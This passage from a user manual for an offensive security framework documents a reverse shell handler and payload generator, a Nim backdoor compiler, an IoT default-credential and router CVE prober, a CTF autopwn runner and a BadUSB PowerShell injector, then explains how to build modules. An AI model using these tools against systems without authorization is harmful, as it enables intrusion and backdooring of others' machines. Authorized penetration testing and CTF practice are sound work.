`revshell` is a multi-session reverse shell handler and payload generator - a Python port of [OnlyShell](https://github.com/malwarekid/OnlyShell) with an extended payload library (30+ one-liners) and a Nim backdoor compiler. Every other secV module that needs a shell handler imports `revshell` - it's the shared shell infrastructure for the whole framework.

### Quick start

```
secV ❯ use revshell

# Start interactive handler
secV (revshell) ❯ set mode serve
secV (revshell) ❯ set ports 4444
secV (revshell) ❯ run target

# Generate all payloads for a host
secV (revshell) ❯ set mode generate
secV (revshell) ❯ set lhost 10.10.10.10
secV (revshell) ❯ set shell all
secV (revshell) ❯ run target

# Compile Nim reverse shell
secV (revshell) ❯ set mode nim_backdoor
secV (revshell) ❯ set lhost 10.10.10.10
secV (revshell) ❯ set target_os linux
secV (revshell) ❯ run target

# CLI shortcut - start on port 4444 immediately
python3 tools/network/revshell/revshell.py 4444
```

### Handler TUI commands

Once the handler is running and a session connects:

| Command | Description |
|---------|-------------|
| `sessions` | List all sessions |
| `interact <id>` | Attach to a session |
| `bg` | Background current session |
| `exec-all <cmd>` | Broadcast to all sessions |
| `kill <id>` | Terminate a session |

### Payload types

`bash_tcp` `bash_udp` `bash_mkfifo` `python3` `python2` `perl` `ruby` `php_proc_open` `php_passthru` `nc` `nc_mkfifo` `ncat` `socat` `socat_pty` `nodejs` `golang` `awk` `lua` `java` `powershell` `powershell_b64` `powershell_iex` `msf_elf` `msf_exe` `msf_apk` and more.

---

## Chapter 27 - iot_pwn

**Version:** 1.0.1 | **Category:** mobile (IoT) | **Path:** `tools/mobile/iot/`

### What it does

`iot_pwn` tests IoT devices and home/enterprise routers for default credentials across SSH, Telnet, FTP, and HTTP admin panels. Also performs SNMP community string brute-force, UPnP SSDP exposure detection, RTSP unauthenticated stream detection, and known router CVE probing.

Covers 68 default credential pairs (routersploit vendor defaults: Huawei, ZTE, TP-Link, D-Link, Zyxel, Netgear, Cisco, Ubiquiti, Dahua, Hikvision, and more).

**CVE checks:** CVE-2017-17215 (Huawei HG532), CVE-2020-29583 (Zyxel backdoor), CVE-2021-20090 (Arcadyan), CVE-2019-16920 (D-Link auth bypass).

### Quick start

```
secV ❯ use iot_pwn
secV (iot_pwn) ❯ run 192.168.1.1

# HTTP + SNMP only
secV (iot_pwn) ❯ set ssh false
secV (iot_pwn) ❯ set telnet false
secV (iot_pwn) ❯ set ftp false
secV (iot_pwn) ❯ set rtsp false
secV (iot_pwn) ❯ set upnp false
secV (iot_pwn) ❯ run 192.168.1.1
```

---

## Chapter 28 - ctfpwn

**Version:** 1.2.0 | **Category:** ctf | **Path:** `tools/ctf/ctfpwn/`

### What it does

`ctfpwn` syncs `github.com/0xb0rn3/CTFs`, lists all rooms sorted newest first, and runs standalone autopwn scripts against target machines. Extracts flags (THM{}/HTB{} patterns), saves output to `~/ZX01C/CTF/<room>/`, and tracks which rooms are new since the last pull.

25+ THM rooms currently. HTB coming.

### Quick start

```
secV ❯ use ctfpwn

# List all rooms
secV (ctfpwn) ❯ set operation list
secV (ctfpwn) ❯ run none

# Run latest room
secV (ctfpwn) ❯ set operation latest
secV (ctfpwn) ❯ run 10.10.85.42

# Run specific room
secV (ctfpwn) ❯ set operation run
secV (ctfpwn) ❯ set ctf simplectf
secV (ctfpwn) ❯ run 10.10.85.42

# Search by technique
secV (ctfpwn) ❯ set operation search
secV (ctfpwn) ❯ set query ssti
secV (ctfpwn) ❯ run none

# Show rooms added since last pull
secV (ctfpwn) ❯ set operation new
secV (ctfpwn) ❯ run none
```

---

## Chapter 29 - badusb

**Version:** 1.0.0 | **Category:** physical | **Path:** `tools/phys/badusb/`

### What it does

`badusb` encodes a PowerShell `.ps1` script as base64 and wraps it in DuckyScript. On execution, the USB HID device opens Win+R → `powershell`, then uses `certutil` to decode and execute the payload - no external tools needed on the attack machine.

Compatible with USB Rubber Ducky, Hak5 devices, and any DuckyScript-compatible tool.

### Quick start

```
secV ❯ use badusb
secV (badusb) ❯ set file_path /tmp/rev.ps1
secV (badusb) ❯ run target

# With metadata + slow hardware delay
secV (badusb) ❯ set file_path /tmp/rev.ps1
secV (badusb) ❯ set title "Reverse Shell"
secV (badusb) ❯ set author "operator"
secV (badusb) ❯ set ducky_lang true
secV (badusb) ❯ set delay_after_ps 1200
secV (badusb) ❯ run target
```

Output saved to `~/.secv/badusb/<stem>_badusb.txt`.

**Note on `delay_after_ps`:** This is the millisecond delay between opening PowerShell and typing the certutil command. On slow/cold machines, PowerShell takes longer to open. Start at 1000 ms and increase if the payload fails.

---

# Part V - How secV Works

---

## Chapter 30 - Architecture

Understanding how secV is built helps you build modules for it and debug problems when things go wrong.

```
┌─────────────────────────────────────────────────────────┐
│                     secV binary (Go)                    │
│                                                         │
│  ┌─────────────────┐    ┌──────────────────────────┐   │
│  │   Shell / REPL  │    │     Module Registry      │   │
│  │                 │    │                          │   │
│  │  Tab completion │    │  Scans tools/ at startup │   │
│  │  Command parser │    │  Reads module.json files │   │
│  │  Param store    │    │  Checks deps with which  │   │
│  └────────┬────────┘    └──────────────────────────┘   │
│           │                                              │
│           │ run <target>                                 │
│           ▼                                              │
│  ┌─────────────────────┐                               │
│  │   Module Executor   │                               │
│  │                     │                               │
│  │  Build JSON payload │                               │
│  │  Spawn subprocess   │──────────────────────────────┤
│  │  Pipe stdin/stdout  │                               │
│  │  Parse JSON result  │   ◄── stdout (JSON results)  │
│  │  Format output      │   ──► stdin (JSON payload)   │
│  └─────────────────────┘                               │
└─────────────────────────────────────────────────────────┘
                              │
                    ┌─────────▼──────────┐
                    │  Module subprocess  │
                    │  (Python/Bash/etc.) │
                    └────────────────────┘
```

**Key design decisions:**

1. **No framework to import.** A module is just a script that reads stdin and writes stdout. No secV SDK, no magic decorators, no special base class. This makes modules easy to write in any language and easy to test without secV.

2. **JSON as the universal interface.** JSON is the lingua franca. secV sends JSON in, modules send JSON out. This is language-agnostic and human-readable.

3. **Binary loader, interpreted modules.** The loader is compiled Go for speed and portability. Modules are interpreted scripts for flexibility and ease of contribution.

4. **Subprocess isolation.** Each module run is a separate subprocess. A module crash doesn't crash secV. Module state doesn't persist between runs (by design).

5. **Timeout enforcement.** The loader enforces `timeout` from `module.json`. If a module hangs, secV kills it after the timeout. This prevents runaway operations from blocking the shell.

---

## Chapter 31 - The JSON Protocol

When you run `secV (netrecon) ❯ run 192.168.1.0/24`, secV builds this JSON and writes it to the module's stdin:

```json
{
  "target": "192.168.1.0/24",
  "params": {
    "mode": "normal",
    "ports": "top-1000",
    "threads": 20
  }
}
```

The module reads stdin, parses the JSON, does its work, and writes a JSON response to stdout:

```json
{
  "success": true,
  "data": {
    "hosts": [
      {
        "ip": "192.168.1.1",
        "hostname": "router.local",
        "os": "Linux",
        "ports": [
          {"port": 80, "protocol": "tcp", "service": "http", "version": "nginx 1.24"}
        ],
        "risk_score": 4.2
      }
    ],
    "summary": {
      "total_hosts": 1,
      "high_risk": 0
    }
  }
}
```

**Response fields:**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `success` | boolean | yes | Whether the operation succeeded |
| `data` | object | yes | The actual results (module-defined structure) |
| `error` | string | no | Error message if `success: false` |
| `warnings` | array | no | Non-fatal warnings |

**Streaming output:**

For long-running operations, modules can write intermediate JSON objects separated by newlines. secV reads each line as it arrives and displays progress in real time. The final line is the full results object.

**Error handling:**

```json
{
  "success": false,
  "error": "adb: device not found"
}
```

secV displays the error message clearly and doesn't try to parse `data`.

---

## Chapter 32 - The module.json Manifest

Every module needs a `module.json` file in its directory. This is what secV reads to know the module exists and how to use it.

**Full example:**

```json
{
  "name": "my-scanner",
  "version": "1.0.0",
  "category": "network",
  "description": "Scans hosts for open ports and service versions",
  "author": "yourname",
  "executable": "python3 main.py",

  "dependencies": ["python3", "nmap"],
  "optional_dependencies": {
    "masscan": "Fast SYN port scanning - sudo apt install masscan",
    "scapy": "Raw socket scanning - pip3 install scapy"
  },

  "inputs": {
    "target": {
      "type": "string",
      "required": true,
      "description": "IP, CIDR, or hostname to scan"
    },
    "ports": {
      "type": "string",
      "default": "1-1000",
      "description": "Port range: 1-1000, top-100, or all"
    },
    "threads": {
      "type": "integer",
      "default": 50,
      "description": "Concurrent scanning threads"
    },
    "verbose": {
      "type": "boolean",
      "default": false,
      "description": "Print each port as it's scanned"
    }
  },

  "timeout": 300,

  "help": {
    "description": "Extended description shown in `info` output",
    "features": [
      "SYN scanning via masscan (fast, root required)",
      "Service version detection via nmap",
      "Concurrent scanning with configurable threads"
    ],
    "notes": [
      "Run as root for SYN scanning",
      "Verbose mode adds significant output volume"
    ],
    "examples": [
      {
        "description": "Quick scan of a subnet",
        "commands": [
          "use my-scanner",
          "set ports top-100",
          "run 192.168.1.0/24"
        ]
      }
    ]
  }
}
```

**Required fields:**

| Field | Type | Description |
|-------|------|-------------|
| `name` | string | Module name - must match directory name |
| `version` | string | Semantic version (e.g. `1.0.0`) |
| `category` | string | `network`, `mobile`, `web`, `AD`, `ctf`, `phys` |
| `description` | string | One-line description |
| `author` | string | Your name or handle |
| `executable` | string | Command to run the module (e.g. `python3 main.py`) |
| `dependencies` | array | Binary names checked with `which` |
| `inputs` | object | Parameter definitions |
| `timeout` | integer | Seconds before secV kills the module |

**The `inputs` object:**

Each key is a parameter name. Value is an object with:

| Field | Required | Description |
|-------|----------|-------------|
| `type` | yes | `string`, `integer`, `float`, `boolean` |
| `required` | no | `true` if the module can't run without it |
| `default` | no | Value used if not set by user |
| `description` | no | Shown in `show options` |
| `options` | no | Array of valid values (shown as hints) |

**The `dependencies` array:**

List **binary names**, not package names. secV checks them with `which`. Example: `"adb"` not `"android-tools-adb"`. The installer maps binary names to packages.

---

## Chapter 33 - The Dependency System

When you run `info <module>`, secV checks every binary in `dependencies` using `which`. It shows:

```
Dependencies:
  python3       ✓ /usr/bin/python3
  nmap          ✓ /usr/bin/nmap
  masscan       ✗ not found  →  sudo apt install masscan
  rustscan      ✗ not found  →  cargo install rustscan

Optional:
  scapy         ✗ not installed  →  pip3 install scapy
```

When a module starts, it typically does its own dependency check in code and provides more detailed error messages for missing optional features.

**The `optional_dependencies` map:**

```json
"optional_dependencies": {
  "masscan": "Fast SYN scanning - sudo apt install masscan",
  "scapy": "Raw socket scanning - pip3 install scapy"
}
```

The value is the install hint shown to the user. secV checks the key with `which` and shows the hint if it's missing.

**Graceful degradation:**

Good modules work with minimal dependencies and unlock more features as dependencies are installed. For example, `netrecon` works with only Python stdlib (TCP connect scan) and adds features as nmap, masscan, cryptography, and geoip2 become available. Never fail hard when an optional dependency is missing - log a warning and skip that feature.

---

## Chapter 34 - The Update System

```bash
secV ❯ update                  # interactive update from within secV
python3 update.py              # check and apply update
python3 update.py --status     # show component versions
python3 update.py --verify     # integrity check
python3 update.py --repair     # fix common issues
python3 update.py --rollback   # restore last known-good backup
python3 update.py --sync-tools # fix module script permissions
```

On `update`, secV:
1. Stashes any uncommitted local changes (`git stash`)
2. Pulls from `https://github.com/secvulnhub/secV.git`
3. Recompiles the Go binary if `main.go` changed
4. Re-installs Python deps if `rqm.md` changed
5. Unstashes your local changes (`git stash pop`)

**After a manual `git pull` on a system install**, refresh the data directory manually:

```bash
go build -ldflags="-s -w" -o secV .
sudo install -m755 secV /usr/local/bin/secV
sudo cp -r tools/ /var/lib/secv/
sudo install -m755 update.py /var/lib/secv/update.py
```

---

# Part VI - Building Your Own Module

---

## Chapter 35 - Module Structure

A secV module is a directory containing:

```
tools/<category>/<name>/
  module.json       ← required: the manifest
  main.py           ← your executable (any name, any language)
  README.md         ← recommended: document what it does
  requirements.txt  ← optional: pip deps for install.sh
  rqm.md            ← optional: system deps for install.sh
```

**Naming conventions:**
- Directory name = module name (what you type in `use`)
- Use lowercase with underscores: `my_scanner`, `web_fuzzer`
- Category should be one of: `network`, `mobile`, `web`, `AD`, `ctf`, `phys`

**After creating your module:**

```
secV ❯ reload
secV ❯ use my_scanner
secV (my_scanner) ❯ show options
```

No restart needed - `reload` rescans `tools/` and picks up the new module instantly.

---

## Chapter 36 - Your First Python Module

Let's build a simple port checker from scratch.

**Step 1: Create the directory**

```bash
mkdir -p tools/network/portcheck
cd tools/network/portcheck
```

**Step 2: Write the script**

```python
#!/usr/bin/env python3
"""portcheck - check if a specific port is open on a host"""
import json
import sys
import socket

def check_port(host: str, port: int, timeout: float) -> dict:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return {"open": True}
    except (socket.timeout, ConnectionRefusedError):
        return {"open": False}
    except Exception as e:
        return {"open": False, "error": str(e)}

def main():
    ctx = json.loads(sys.stdin.read())
    target = ctx["target"]
    params = ctx.get("params", {})

    port = int(params.get("port", 80))
    timeout = float(params.get("timeout", 3.0))

    result = check_port(target, port, timeout)

    print(json.dumps({
        "success": True,
        "data": {
            "host": target,
            "port": port,
            "open": result["open"],
            "error": result.get("error")
        }
    }))

if __name__ == "__main__":
    main()
```

**Step 3: Write module.json**

```json
{
  "name": "portcheck",
  "version": "1.0.0",
  "category": "network",
  "description": "Check if a specific port is open on a host",
  "author": "yourname",
  "executable": "python3 main.py",
  "dependencies": ["python3"],
  "optional_dependencies": {},
  "inputs": {
    "port": {
      "type": "integer",
      "default": 80,
      "description": "Port number to check"
    },
    "timeout": {
      "type": "float",
      "default": 3.0,
      "description": "Connection timeout in seconds"
    }
  },
  "timeout": 30,
  "help": {
    "description": "TCP connect check against a single port",
    "features": ["TCP connect scan", "Configurable timeout"],
    "examples": [
      {
        "description": "Check if port 22 is open",
        "commands": [
          "use portcheck",
          "set port 22",
          "run 192.168.1.1"
        ]
      }
    ]
  }
}
```

**Step 4: Test it**

```
secV ❯ reload
secV ❯ use portcheck
secV (portcheck) ❯ set port 22
secV (portcheck) ❯ run 192.168.1.1
```

**Step 5: Test without secV** (important for development)

```bash
echo '{"target": "192.168.1.1", "params": {"port": 22}}' | python3 main.py
```

You should get:
```json
{"success": true, "data": {"host": "192.168.1.1", "port": 22, "open": true, "error": null}}
```

This direct test is faster than going through secV every time you make a change.

---

## Chapter 37 - Your First Bash Module

Bash modules work the same way - read JSON from stdin, write JSON to stdout. The only requirement is `jq` for JSON parsing.

```bash
#!/usr/bin/env bash

# Read stdin
input=$(cat)

# Parse parameters
target=$(echo "$input" | jq -r '.target')
port=$(echo "$input" | jq -r '.params.port // "80"')
timeout=$(echo "$input" | jq -r '.params.timeout // "3"')

# Do the work
result=$(timeout "$timeout" bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null && echo "open" || echo "closed")

# Output JSON
jq -n \
  --arg host "$target" \
  --argjson port "$port" \
  --arg status "$result" \
  '{
    "success": true,
    "data": {
      "host": $host,
      "port": $port,
      "open": ($status == "open")
    }
  }'
```

`module.json` for a Bash module:

```json
{
  "name": "portcheck-bash",
  "version": "1.0.0",
  "category": "network",
  "description": "TCP port check in Bash",
  "author": "yourname",
  "executable": "bash main.sh",
  "dependencies": ["bash", "jq"],
  "inputs": {
    "port": { "type": "integer", "default": 80 },
    "timeout": { "type": "float", "default": 3.0 }
  },
  "timeout": 30
}
```

**Test directly:**

```bash
echo '{"target": "192.168.1.1", "params": {"port": 22}}' | bash main.sh
```

---

## Chapter 38 - Other Languages

Any language works. The contract is: read `{"target": "...", "params": {...}}` from stdin, write `{"success": bool, "data": {...}}` to stdout.

**Go:**

```go
package main

import (
    "encoding/json"
    "fmt"
    "net"
    "os"
    "time"
)

type Input struct {
    Target string                 `json:"target"`
    Params map[string]interface{} `json:"params"`
}

type Output struct {
    Success bool        `json:"success"`
    Data    interface{} `json:"data"`
}

func main() {
    var input Input
    json.NewDecoder(os.Stdin).Decode(&input)

    port := "80"
    if p, ok := input.Params["port"].(string); ok {
        port = p
    }

    conn, err := net.DialTimeout("tcp", input.Target+":"+port, 3*time.Second)
    open := err == nil
    if conn != nil {
        conn.Close()
    }

    out, _ := json.Marshal(Output{
        Success: true,
        Data: map[string]interface{}{
            "host": input.Target,
            "port": port,
            "open": open,
        },
    })
    fmt.Println(string(out))
}
```

Compile: `go build -o portcheck main.go`
Executable in `module.json`: `"./portcheck"`

**Rust, C, C++** - same pattern. Compile to a binary, set the executable path.

**Node.js:**

```javascript
const chunks = [];
process.stdin.on('data', d => chunks.push(d));
process.stdin.on('end', () => {
    const ctx = JSON.parse(chunks.join(''));
    const target = ctx.target;
    const port = ctx.params?.port ?? 80;

    const net = require('net');
    const client = new net.Socket();
    client.setTimeout(3000);
    client.connect(port, target, () => {
        client.destroy();
        console.log(JSON.stringify({ success: true, data: { host: target, port, open: true } }));
    });
    client.on('error', () => {
        console.log(JSON.stringify({ success: true, data: { host: target, port, open: false } }));
    });
});
```

Executable: `"node main.js"`

---

## Chapter 39 - The module.json Specification

Full field reference for `module.json`:

```
{
  "name"                   string   required  Module identifier (matches directory name)
  "version"                string   required  Semantic version: "1.0.0"
  "category"               string   required  network | mobile | web | AD | ctf | phys
  "description"            string   required  One-line description
  "author"                 string   required  Name or handle
  "executable"             string   required  Command to run: "python3 main.py", "./binary", "bash main.sh"
  "dependencies"           array    required  Binary names checked with which: ["python3", "nmap"]
  "optional_dependencies"  object   optional  {binary: "install hint string"}
  "inputs"                 object   required  Parameter definitions (see below)
  "timeout"                integer  required  Seconds before secV kills the process
  "help"                   object   optional  Extended help shown in `info`
    "description"          string             Extended description
    "features"             array              Feature list strings
    "notes"                array              Important notes
    "examples"             array              [{description, commands: []}]
  "options"                array    optional  secV GUI option IDs (for GUI modules)
  "features"               array    optional  Feature list for module registry display
  "examples"               array    optional  Top-level examples array
}
```

**`inputs` object - per parameter:**

```
{
  "type"        string   required  string | integer | float | boolean
  "required"    boolean  optional  Default false
  "default"     any      optional  Used when not set
  "description" string   optional  Shown in show options
  "options"     array    optional  Valid value hints: ["normal", "deep", "stealth"]
}
```

---

## Chapter 40 - gen_module.py

`gen_module.py` auto-generates `module.json` by scanning your source for parameter usage patterns.

What it detects:
- Python: `params.get("key")`, `params.get("key", default)`, `int(params.get(...))`, `argparse` arguments
- Bash: `jq .params.key`, `jq -r '.params.key'`
- Types: `int(...)` → `integer`, `float(...)` → `float`, `_bool(...)` → `boolean`, everything else → `string`
- Defaults: from `params.get("key", "default_value")`
- Version/author: from Python docstrings

```bash
# Print generated JSON (preview, no files modified)
python3 gen_module.py tools/network/my-tool/

# Write module.json into the tool directory
python3 gen_module.py tools/network/my-tool/ --write

# Merge newly detected params into existing hand-written module.json
python3 gen_module.py tools/network/my-tool/ --update
```

**Fill in manually after generation:**
- `help.parameters[*].description` - the generator can't infer meaning
- `help.examples` - same
- `options` arrays on parameters with fixed valid values
- `author`, `description`, `help.features`, `help.notes`

Use `gen_module.py --update` during development to add newly added parameters to an existing `module.json` without losing the descriptions you've already written.

---

## Chapter 41 - Testing Your Module

All testing is done against real system tools on the live machine. There are no mocks, no sandboxes, no faked dependencies. If a command works in the terminal it should work through secV. If it does not, the failure is in the JSON dispatch, the executable path, or a missing system dependency - not in the logic of the underlying tool.

**Step 1 - Pipe test directly (fastest, no secV needed)**

From inside your module folder:

```bash
echo '{"target":"127.0.0.1","params":{"port":"22"}}' | python3 portcheck.py
```

If the output looks correct here, the module logic is sound. Any bug that only appears through secV is a dispatch bug (check your `module.json` `executable` field or your stdin read line).

Validate that the output lines are parseable:

```bash
# Confirm FINDING lines are valid JSON
echo '{"target":"127.0.0.1","params":{"port":"22"}}' | python3 portcheck.py \
  | grep '^FINDING:' | sed 's/^FINDING: //' | python3 -m json.tool
```

**Step 2 - Validate module.json**

```bash
python3 -m json.tool module.json    # must print the parsed JSON with no errors
```

**Step 3 - Dependency check inside secV**

```
./secV
secV ❯ info portcheck
```

Every entry in `module.json dependencies` must show `✓ Found`. Any `✗ Missing` means the binary is not on PATH - install it system-wide with your package manager. Do not install dependencies into user-local or non-PATH locations.

**Step 4 - Live reload cycle**

Edit the module file, then without restarting secV:

```
secV ❯ reload
secV ❯ use portcheck
secV (portcheck) ❯ show options        # verify all params appear with correct types
secV (portcheck) ❯ set port 22
secV (portcheck) ❯ run 127.0.0.1
```

Confirm:
- FINDING lines appear in the terminal output
- No Python traceback reaches stdout (tracebacks break secV's JSON parser)
- The session finding count increments correctly

**Step 5 - Error handling**

Your module must never let an unhandled exception print to stdout - it breaks the protocol. Always wrap the entry point:

```python
try:
    main()
except Exception as e:
    print(json.dumps({"success": False, "error": str(e)}))
    sys.exit(1)
```

Test that error paths emit valid JSON rather than a traceback:

```bash
# Empty target
echo '{"target":"","params":{}}' | python3 portcheck.py

# Missing required param
echo '{"target":"127.0.0.1","params":{}}' | python3 portcheck.py
```

Both must return a JSON line on stdout, not a Python traceback.

**Step 6 - Missing optional dependency graceful degradation**

Temporarily rename an optional binary to simulate its absence:

```bash
sudo mv /usr/bin/nmap /usr/bin/nmap.bak
echo '{"target":"127.0.0.1","params":{}}' | python3 portcheck.py
sudo mv /usr/bin/nmap.bak /usr/bin/nmap
```

The module must:
- Not crash
- Print a clear `[!] nmap not found - skipping ...` warning
- Complete with reduced output, not zero output

**Step 7 - Cross-module regression**

After adding your module, run an existing module to confirm the `reload` did not corrupt the module registry:

```
secV ❯ reload
secV ❯ use netrecon
secV (netrecon) ❯ show options    # all existing params must still appear
secV (netrecon) ❯ run 127.0.0.1
```

**Step 8 - System health check before PR**

Run the full health check to confirm your module's deps are all present on a clean system:

```bash
./secV -check-deps   # must show ✓ for all deps of your new module

# Final pipe smoke test
echo '{"target":"127.0.0.1","params":{"port":"22","timeout_sec":"3"}}' \
  | python3 tools/network/portcheck/portcheck.py
```

---

## Chapter 42 - Contribution Checklist and PR Guide

**Before opening a pull request:**

- [ ] Module runs without optional dependencies (graceful degradation, not a crash)
- [ ] `module.json` is valid JSON - verified with `python3 -m json.tool module.json`
- [ ] All required fields present in `module.json`
- [ ] `help.parameters` has descriptions for every parameter
- [ ] `help.examples` has at least one working example
- [ ] `README.md` inside the module directory explains what it does
- [ ] No unhandled exceptions reach stdout - all errors return `{"success": false, "error": "..."}`
- [ ] Binary names (not pip package names) in `dependencies`
- [ ] New pip packages added to top-level `rqm.md` under `#python`
- [ ] New system packages added under the relevant distro sections in `rqm.md`
- [ ] `MODULES.md` updated with the new module entry

**Directory structure:**

```
tools/<category>/<name>/
  module.json        ← required
  main.py            ← your script (or whatever name/extension)
  README.md          ← required
  rqm.md             ← optional: system deps
```

**Opening the PR:**

1. Fork `https://github.com/secvulnhub/secV`
2. Create a branch: `git checkout -b add-my-tool`
3. Add your module directory
4. Update `MODULES.md`
5. Run the checklist above
6. Open a PR with:
   - What the module does (one paragraph)
   - What it requires to run
   - A working example output

**Code style (Python):**

- Python 3.8+ compatible (no walrus operator in critical paths)
- No print() to stdout except the final JSON result - use stderr for debug output
- No global mutable state
- `params.get("key", default)` not `params["key"]` for optional parameters

**Need help?**

Open an issue on GitHub with your question or the error you're hitting.

---

# Part VII - Reference

---

## Chapter 43 - Shell Command Reference

**Top-level commands (no module loaded):**

| Command | Description |
|---------|-------------|
| `show modules` | List all available modules with version and description |
| `search <keyword>` | Search by name, category, or description keyword |
| `use <module>` | Load a module |
| `info <module>` | Full module info + live dependency check |
| `reload` | Rescan tools/ directory (picks up new modules) |
| `update` | Pull latest secV from git + recompile |
| `clear` | Clear terminal |
| `exit` | Quit secV |

**Module context commands (after `use <module>`):**

| Command | Description |
|---------|-------------|
| `show options` | List all parameters with type, default, current value |
| `set <key> <value>` | Set a parameter |
| `run <target>` | Execute the module |
| `help module` | Display module help text |
| `back` | Unload module, return to top-level prompt |
| `info` | Module info without needing a name |

**Tab completion:**

Tab works for:
- `use <Tab>` - all available module names
- `search <Tab>` - common search terms
- `set <Tab>` - parameter names for the loaded module
- Commands at the top-level prompt

---

## Chapter 44 - Troubleshooting

**Module not found after adding:**

```
secV ❯ reload
```

If it still doesn't appear, check:
- `module.json` is valid JSON: `python3 -m json.tool module.json`
- The `name` field matches the directory name exactly
- The directory is under `tools/<category>/<name>/`

**Permission denied when running secV:**

```bash
chmod +x secV install.sh
```

**Go binary won't compile:**

```bash
# Arch
sudo pacman -S go

# Debian/Ubuntu/Kali
sudo apt install golang-go

# Verify Go version (need 1.21+)
go version

# Compile manually
go mod tidy
go build -ldflags="-s -w" -o secV .
```

**Module times out:**

Check the `timeout` field in `module.json`. Increase it for operations that legitimately take longer. If the module hangs, add debug logging to stderr to find where it's stuck.

**adb: device not found:**

```bash
adb devices          # should list your device
adb kill-server
adb start-server
adb devices
```

Make sure USB debugging is enabled on the Android device (Settings → Developer Options → USB Debugging).

**pip install fails:**

```bash
pip3 install --user <package>   # install to user directory (no sudo)
# or
pip3 install --break-system-packages <package>   # on newer Debian-based systems
```

**Update fails with merge conflict:**

```bash
git stash
git pull origin main
git stash pop
# If stash pop fails, resolve conflicts manually then:
python3 update.py --repair
```

**Python module ImportError:**

The module prints an error like `ModuleNotFoundError: No module named 'frida'`. Install the missing package:

```bash
pip3 install frida-tools
```

Check the module's `README.md` or `rqm.md` for a complete dependency list.

**Module prints raw error text to stdout (breaks JSON parsing):**

This is a module bug. The module should catch all exceptions and return `{"success": false, "error": "..."}`. Report it as a GitHub issue with the module name and error output.

---

## Chapter 45 - Legal

SecV is built for **authorized security testing only.**

Before scanning, testing, or interacting with any system:
- You must own the system, or
- You must have explicit written authorization from the system owner

Unauthorized testing may violate:
- Computer Fraud and Abuse Act (US)
- Computer Misuse Act (UK)
- Equivalent statutes in your jurisdiction

**What "authorized" means in practice:**
- A signed pentest agreement or statement of work
- Written email authorization from the system owner (keep a copy)
- Testing within a CTF lab or dedicated training range (TryHackMe, HackTheBox, etc.)
- Testing your own devices and networks

The authors of secV accept no liability for misuse. If you're unsure whether your testing is authorized, don't proceed until you've confirmed in writing.

---

## License

MIT © 2024–2026 SecVulnHub

---

<div align="center">

**SecV** · tauri v2.4.3 · built by 0xb0rn3

*one shell, any language*

</div>
